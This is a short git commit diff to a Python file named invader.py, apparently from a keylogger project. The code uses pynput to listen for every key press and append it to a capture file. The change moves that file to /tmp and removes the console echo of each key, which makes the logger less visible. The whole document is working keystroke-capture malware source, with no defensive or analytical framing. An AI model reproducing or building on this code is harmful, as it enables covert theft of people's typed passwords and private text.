667238efab94912bb7a405a1240ade416d0d5b19
daemoncibsec <daemoncibsec@gmail.com>
2026-01-23 00:49:00 +0100

    Forgot to delete a line

--- invader.py
+++ invader.py
@@ -3,11 +3,10 @@
 from pynput import keyboard
 
 def on_press(key):
-    with open('captured.txt', 'a') as f:
+    with open('/tmp/captured.txt', 'a') as f:
         if str(key) == 'Key.space':
             key = ' '
         f.write(f'{str(key).strip("''")}')
-        print(f"{key}")
 
 if __name__ == "__main__":
     listener = keyboard.Listener(on_press=on_press)
